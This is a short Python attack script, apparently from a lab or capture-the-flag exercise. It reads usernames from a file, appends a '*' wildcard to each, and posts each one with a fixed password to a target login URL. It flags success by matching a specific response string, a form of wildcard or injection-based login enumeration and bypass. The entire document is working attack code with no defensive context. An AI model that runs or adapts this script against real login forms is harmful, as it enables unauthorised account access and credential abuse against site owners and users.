# first trying brute_all_charcters.properly


import requests
import sys


url= sys.argv[1] # url 
username_file= sys.argv[2] # usernamefile
print("USage: python python_file.py <URL>")


password="known_password"

try:
    with open(username_file, "r") as file:
    #   username= []
    #    for line in file:
    #         stripped_lines=line.strip()

    #         if stripped_lines:
    #             modified_lines = stripped_lines + "*"
                
    #             username.append(modified_lines)
        usernames = [line.strip()+"*" for line in file if line.strip()]
except FileNotFoundError:
    print(f"File {username_file} not found, pls ensure it is valid filename")
     
for username in usernames:
    data={
        "username":username,
        "password":password
    }
    try:
        response= requests.post(url, data=data)
        if 'Login successful but the site is temporarily down for security reasons' in response.text:
            print(f"attempt with username':{username} was successful")

        elif'Login failed' in response.text:
            print(f"attempt with username:{username}, failed!")
        else:
            print(f"attempt with username:{username}, recieved unexpected response")
    
    except requests.exceptions.RequestException as e:
        print("An error occured:", e)




                 


